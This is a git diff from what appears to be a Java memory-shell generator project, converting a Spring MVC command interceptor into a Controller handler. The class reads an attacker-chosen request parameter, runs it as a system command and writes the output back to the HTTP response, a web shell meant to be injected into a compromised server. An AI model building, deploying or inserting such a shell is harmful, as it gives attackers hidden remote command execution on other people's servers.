@@ -1,7 +1,7 @@
-package com.reajason.javaweb.memshell.springmvc.command;
+package com.reajason.javaweb.memshell.springwebmvc.command;
 
-import org.springframework.web.servlet.AsyncHandlerInterceptor;
 import org.springframework.web.servlet.ModelAndView;
+import org.springframework.web.servlet.mvc.Controller;
 
 import javax.servlet.ServletOutputStream;
 import javax.servlet.http.HttpServletRequest;
@@ -12,15 +12,14 @@ import java.io.InputStream;
  * @author ReaJason
  * @since 2024/12/22
  */
-public class CommandInterceptor implements AsyncHandlerInterceptor {
+public class CommandControllerHandler implements Controller {
     public static String paramName;
 
 
-    public CommandInterceptor() {
+    public CommandControllerHandler() {
     }
 
-    @Override
-    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
         try {
             String cmd = request.getParameter(paramName);
             if (cmd != null) {
@@ -32,26 +31,10 @@ public class CommandInterceptor implements AsyncHandlerInterceptor {
                 while ((length = inputStream.read(buf)) != -1) {
                     outputStream.write(buf, 0, length);
                 }
-                return false;
             }
         } catch (Exception e) {
             e.printStackTrace();
         }
-        return true;
-    }
-
-    @Override
-    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
-
-    }
-
-    @Override
-    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
-
-    }
-
-    @Override
-    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
-
+        return null;
     }
 }
